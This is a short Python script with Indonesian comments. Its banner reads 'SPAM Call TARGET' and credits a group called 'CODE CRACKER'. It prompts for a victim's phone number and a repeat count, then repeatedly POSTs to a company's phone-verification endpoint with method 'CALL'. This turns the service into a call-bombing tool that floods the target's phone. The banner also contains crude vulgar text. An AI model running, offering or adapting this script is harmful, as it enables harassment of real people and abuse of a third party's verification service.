import os,sys,time,requests
from time import sleep

#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
os.system("clear")
banner= """
\033[1;30m<════════════[\033[1;33;41m • \033[1;37m SPAM Call TARGET \033[1;33m• \033[0m\033[1;30m]══════════════>
\033[37m===================================================\033[37m
\033[37m[\033[31m•\033[31m\033[37m]\033[37m\033[32m Authour \033[37m:\033[33m FAZRY S
\033[37m[\033[31m•\033[37m]\033[32m Team \033[37m   : \033[33mCODE CRACKER
\033[37m[\033[31m•\033[37m]\033[32m gitHub\033[37m  : \033[33mhttps:github.com/
\033[37m[\033[31m•\033[37m]\033[32m Yotube\033[37m  : \033[33mKONTOOOL & MEMEK
\033[37m===================================================\033[37m"""
sleep(1)
print(banner)
# Bagian Data
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
mengetik("[KALO SUDAH LIMIT TUNGUH BEBERAPA MENIT LAGI BARU ULANG] ")
time.sleep(3)
# Jangan di ubah sayang ku😘
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# Jangan di ubah sayng😘
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))

